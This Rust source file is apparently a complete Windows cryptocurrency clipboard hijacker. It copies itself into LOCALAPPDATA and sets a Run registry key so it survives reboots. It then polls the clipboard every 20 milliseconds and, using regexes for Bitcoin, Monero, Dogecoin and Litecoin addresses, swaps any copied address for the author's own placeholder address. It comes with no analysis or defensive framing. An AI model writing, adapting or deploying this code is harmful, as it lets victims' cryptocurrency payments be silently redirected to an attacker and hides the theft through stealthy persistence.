use clipboard::{ClipboardProvider, windows_clipboard::WindowsClipboardContext};
use regex::Regex;
use std::{thread, time::Duration, collections::HashMap, str::FromStr, ops::Deref, io, path::PathBuf, fs::{create_dir_all, copy}};
use winreg::{
    enums::*,
    RegKey
};
use std::env;


/**
 * use std::io;
use std::path::PathBuf;
use std::env;
use winreg::enums::*;
use winreg::RegKey;

fn main() -> io::Result<()> {
    let app_name = "YourAppName";
    let startup_registry_key = format!(r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\{}", app_name);

    let exe_path = get_executable_path()?;
    add_to_startup_registry(&startup_registry_key, &exe_path)?;

    println!("Added {} to startup registry.", app_name);
    Ok(())
}

fn get_executable_path() -> io::Result<PathBuf> {
    let exe_path = env::current_exe()?;
    Ok(exe_path)
}

fn add_to_startup_registry(startup_registry_key: &str, exe_path: &PathBuf) -> io::Result<()> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let software = hkcu.open_subkey_with_flags("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", KEY_ALL_ACCESS)?;
    software.set_value(startup_registry_key, &exe_path.to_string_lossy())?;
    Ok(())
}
 */

static MUTEX: &str = "adsdfs98f76sda98fysdf";

const BTC_ADDR: &str = "sdfdfs";
const XMR_ADDR: &str = "dfssdf";
const DGE_ADDR: &str = "dfssfd";
const LTC_ADDR: &str = "dsfsdf";

fn add_to_startup_registry(path: String) -> io::Result<()> {
    let sub_key = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

    let key = RegKey::predef(HKEY_CURRENT_USER)
        .open_subkey_with_flags(
            sub_key, 
            KEY_WRITE
        )?;

    key.set_value(MUTEX,  &path)
}

fn persistence() -> io::Result<()> {
    let current_path = env::current_exe()?;
    let desired_path = PathBuf::from(env::var("LOCALAPPDATA").unwrap()).join(MUTEX);

    let file_name = current_path.file_name().unwrap();
    let destination_path = desired_path.join(file_name);

    match add_to_startup_registry(destination_path.to_str().unwrap().to_string()) {
        Ok(..) => {
            create_dir_all(&desired_path)?;
            copy(current_path, destination_path)?;
        },
        Err(..) => {}
    };

    Ok(())
}

fn scan(check_map: &HashMap<&str, &str>) -> bool {
    let mut cb_prov = <WindowsClipboardContext as ClipboardProvider>::new().unwrap();

    let result = cb_prov.get_contents();

    let mut check_set_contents = |
        check: &str, 
        set: &str, 
        clipoard_text: String
    | -> Option<bool> {
        if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
            match cb_prov.set_contents(String::from(set)) {
                Ok(..) => return Some(true),
                Err(..) => ()
            }
        }

        return None;
    };

    if result.is_ok() {
        let clipboard_text: String = result.unwrap();

        for record in check_map {
            if check_set_contents(
                record.0, 
                record.1,
                clipboard_text.clone()
            ).is_some() { 
                return true
            };
        }
    }

    return false;
}

fn main() {
    persistence();

    let map: HashMap<&str, &str> = HashMap::from_iter([
        (r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$", BTC_ADDR),
        (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
        (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
        (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR)
    ]);

    loop {
        scan(&map);

        thread::sleep(Duration::from_millis(20));
    }
}